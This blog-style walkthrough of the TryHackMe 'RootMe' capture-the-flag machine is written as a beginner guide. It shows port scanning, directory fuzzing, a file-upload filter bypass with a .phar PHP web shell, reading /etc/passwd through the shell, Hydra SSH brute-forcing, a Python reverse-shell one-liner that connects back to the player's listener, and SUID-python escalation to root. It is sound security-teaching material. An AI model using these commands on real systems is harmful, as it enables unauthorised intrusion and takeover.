+++
title = "TryHackMe - Root Me"
tags = [
    "ctf"
]
date = "2022-10-03"
toc = true
+++

# Premise

`RootMe` is an introductory machine challenge on TryHackMe where the player is presented with a Linux machine they must get access to. This article is written to be more of a guide than a challenge writeup, with the goal of helping newer CTF players accustomed to some of the tools and techniques used for these kinds of challenges.

Throughout this walkthrough you'll see reference to `$target` which is just me storing the IP address of the target machine in an environment variable for easier reference and reuse.

# Recon

A good place to start is to see what the target machine is running, both for services and OS. We can do this by running `nmap` against it with a few flags:

```
sudo nmap -p- -sV -sC -vvv -o nmap.out $target
```

This will scan the full port range of the box, try to determine versions, run default scripts against the target, and dump our output to `nmap.out`. This isn't something you'd probably want to do against a target in a pen test as it will be painfully obvious what you're doing, but for the puposes of these challenges it's just fine.

This scan shows us that we've got TCP 22 (SSH) and 80 (HTTP) open on the target machine, and that it's running Apache 2.4.29.

With these two pieces of information available, next steps would be to see what SSH authentication mechanisms the server can provide, as well as fuzzing the web server to see what directories (and possibly hostnames) it responds on.

```
# Determine what auth types we see
$ ssh -vvv $target

# Fuzz the webserver to see what content may be available
$ ffuf -u http://$target/FUZZ -w ~/gh/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
````

The SSH check shows us that the server will accept password based auth, or public key authentication. Let's keep an eye out for private key files, the ability to add a key to `authorized_keys` for a user, or hints that we can find a password. We can always brute force, and we may need to later, but that's often not ideal.

Fuzzing the webserver shows us the following directories:
- /uploads (this is interesting)
- /panel (also interesting)
- /js
- /css

`uploads` redirects to `panel` which prompts us to uploada file. That'll be the next thing to play around with - see what the site does when we send it data we control. 

# What can we upload? 

Seemingly anything. The first attempt here is to upload a random file, and that's met with `O arquivo foi upado com sucesso!` which roughly translates to `File successfully uploaded!`.

We don't get a path for the uploaded file returned, however, making this slightly less useful. Let's take a closer look at the upload, and response, by capturing the traffic with Burp Suite (or similar tool).

The upload:

```
POST /panel/ HTTP/1.1
Host: 10.10.186.89
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------20201163193198834099211560924
Content-Length: 354
Origin: http://10.10.186.89
DNT: 1
Connection: close
Referer: http://10.10.186.89/panel/
Cookie: PHPSESSID=kdmm74iroebpfj9612h6vrjou5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name="fileUpload"; filename="bar"
Content-Type: application/octet-stream

foo

-----------------------------20201163193198834099211560924
Content-Disposition: form-data; name="submit"

Upload
-----------------------------20201163193198834099211560924--
```

While the response doesn't give us anything overly interesting, since we know the filename, and the directory structure on the taret, we can make some assumptions. We've uploaded a file called `bar`... let's see if it exists at `http://$target/uploads/bar` - it does!

The other piece of information we see here is that there's a `PHPSESSID` cookie, so we can assume the server is _probably_ running PHP. Since we have arbitrary file upload capability, and we know where the file will land, maybe we can upload a [web shell](https://en.wikipedia.org/wiki/Web_shell) like [this one](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985).

The website prevents us from uploading a file with the `.php` extension, so let's try bypassing that by just uploading it as an `html` file (e.g. `shell.html`). That works, but our shell doesn't seem to be able to actually run any commands. What if we try another PHP file extension like `.phar`? Bingo.

```
curl http://10.10.186.89/uploads/shell.phar\?cmd\=whoami
<html>
<body>
<form method="GET" name="shell.phar">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
www-data
</pre>
</body>
</html>
```

# Running commmands

Now that we've got a way to poke around on the remote machine, let's see if we can find our first flag, and then a way to get direct access. I want to start by exploring the file system - seeing where I am with `pwd`, and dumping directory contents with `ls`. I also want to see what other users we have on the system, so that we can start to try to gain access as one of them:

```
http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fetc%2Fpasswd
```

Removing the users with no shell, or that we're not interested in, we get the following:

```
root:x:0:0:root:/root:/bin/bash
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
test:x:1001:1001:,,,:/home/test:/bin/bash
```

This recon also leads us to our first flag under `/var/www/` which we can retrieve with `http://10.10.186.89/uploads/shell.phar?cmd=cat+%2Fvar%2Fwww%2Fuser.txt`.

# Persistence

Let's see if we can find anything under `/home/test` or `/home/rootme`. Nope, `ls` on either directory returns nothing, so they're either empty or more likely we don't have permission to see anything. While there's no luck on that front, perhaps we can brute force a password for SSH access with `Hydra`:

I'm going to start with the `test` user, and the `RockYou` wordlist:

```
hydra -l test -p ~/tools/rockyou.txt ssh://$target
```

No luck here, but maybe there are some other options. We could look at a few possibilities here:

- We can look for some other interesting privilege escalation mechanisms like binaries with the SUID bit, which may just give us root acces (`find / -user root -perm -4000`).
- Since we can run arbitrary commands, we can probably get a reverse shell.
- We know we can upload files and run arbitrary commands, so we could load something like `linpeas` or `linenum`.

Checking the SUID binaries first, we can see a pretty normal list, however this also includes `/usr/bin/python` which it definitely shouldn't... Can we run commands as `root` simply by invoking them through `python`?

Let's try to pop a [reverse shell](https://www.revshells.com/) from the `root` user. This will mean we need to set up a listener on our machine - `nc -l 9001` - and then spawn the connection from the remote machine to us:

```
export RHOST="10.13.41.1";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

This gets us a reverse shell, but it's still running as the `www-data` user. Let's try using Python directly to get us a root shell since it has the ability to do so in this challenge:

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
```

GG!
